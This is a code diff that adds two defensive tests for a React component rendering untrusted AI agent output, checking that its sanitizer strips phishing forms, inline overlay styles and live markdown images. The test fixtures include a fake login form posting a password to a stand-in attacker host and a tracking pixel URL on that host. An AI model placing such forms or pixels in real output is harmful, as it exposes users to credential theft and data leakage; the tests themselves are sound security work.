@@ -37,6 +37,39 @@ describe("AgentResponseCard — untrusted HTML", () => {
     );
     expect(container.querySelector("iframe")).toBeNull();
   });
+
+  it("strips forms, form controls and inline style on the allowHtml path", () => {
+    // A fake login form or a restyled overlay drawn from agent output is a
+    // phishing / clickjacking surface even without script.
+    const formHtml =
+      '<form action="https://evil.example/steal">' +
+      '<input name="password" type="password">' +
+      '<button>Sign in</button>' +
+      '<textarea></textarea><select></select>' +
+      '</form>' +
+      '<p style="position:fixed;inset:0;background:#000">overlay</p>';
+    const { container } = renderWithProviders(
+      <AgentResponseCard entry={{ ...baseEntry, content: formHtml }} allowHtml />
+    );
+    expect(container.querySelector("form")).toBeNull();
+    expect(container.querySelector("input")).toBeNull();
+    expect(container.querySelector("button")).toBeNull();
+    expect(container.querySelector("textarea")).toBeNull();
+    expect(container.querySelector("select")).toBeNull();
+    // Inline style must be dropped so agent output cannot restyle the page.
+    expect(container.querySelector("[style]")).toBeNull();
+  });
+
+  it("renders a markdown image as a link, not a live <img>", () => {
+    const { container } = renderWithProviders(
+      <AgentResponseCard
+        entry={{ ...baseEntry, content: "![pixel](https://evil.example/pixel.png)" }}
+      />
+    );
+    expect(container.querySelector("img")).toBeNull();
+    const link = container.querySelector('a[href="https://evil.example/pixel.png"]');
+    expect(link).not.toBeNull();
+  });
 });
 
 describe("AgentResponseCard", () => {
